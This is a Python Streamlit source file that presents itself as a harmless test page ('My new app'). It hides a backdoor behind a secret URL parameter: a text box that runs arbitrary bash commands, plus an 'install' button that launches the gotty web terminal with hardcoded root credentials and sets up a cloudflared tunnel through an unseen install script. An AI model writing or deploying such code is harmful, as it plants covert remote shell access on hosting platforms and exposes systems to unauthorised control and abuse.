import streamlit as st
import subprocess
import time
st.title("🎈 My new app")
st.write("我的测试页面")
# 获取 URL 查询参数
params = st.query_params

sqconfig = params.get("sqconfig", None)
if sqconfig == "110":
    # 启动一个持久的 CMD 会话
    p = subprocess.Popen("/bin/bash", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    def run_cmd(cmd):
        p.stdin.write(cmd + "\n")
        p.stdin.flush()
        p.stdin.write("echo [END]\n")
        p.stdin.flush()

        output_lines = []
        while True:
            line = p.stdout.readline()
            if line.strip() == "[END]":
                break
            output_lines.append(line)

        return "".join(output_lines)

    # 设置默认值（推荐放在顶部）
    if "resp_arr" not in st.session_state:
        st.session_state.resp_arr = []
    cmd = st.text_input("输入命令：")

    if st.button("执行"):
        try:
            result = run_cmd(cmd)
            st.session_state.resp_arr.append(result)
            for item in st.session_state.resp_arr:
                st.write(str(item))
        except subprocess.CalledProcessError as e:
            st.text_area("错误输出", e.output, height=300)

    if st.button("执行安装"):
        

        st.write(
        "开始搭建环境"
        )
        st.write("ls")
        st.write(run_cmd("ls"))

        time.sleep(3)
        st.write(run_cmd("chmod 777 gotty"))

        # 运行gotty
        run_gotty = run_cmd("nohup ./gotty --credential root:Sq@987654321 -w bash > gotty.log 2>&1 &")
        st.write(
            run_gotty
        )
        # Add cloudflare gpg key

        st.write("Add cloudflare gpg key")
        st.write(
            run_cmd("sudo mkdir -p --mode=0755 /usr/share/keyrings")
        )
        st.write(
            run_cmd("curl -fsSL https://pkg.cloudflare.com/cloudflare-main.gpg | sudo tee /usr/share/keyrings/cloudflare-main.gpg >/dev/null")
        )
        # Add this repo to your apt repositories
        st.write("Add this repo to your apt repositories")
        st.write(
            run_cmd("echo 'deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared any main' | sudo tee /etc/apt/sources.list.d/cloudflared.list")
        )
        # install cloudflared
        st.write("install cloudflared")
        st.write(
            run_cmd("sudo apt-get update && sudo apt-get install cloudflared")
        )

        st.write("zert_trust")
        st.write(run_cmd("sudo cloudflared service uninstall"));
        time.sleep(3)
        st.write(run_cmd("chmod 777 install_cloudflare.sh"))
        st.write(
            run_cmd("./install_cloudflare.sh")
        )
        time.sleep(5)
        st.write(run_cmd("ps -ef |  grep cloudflare"))
        st.write("完成")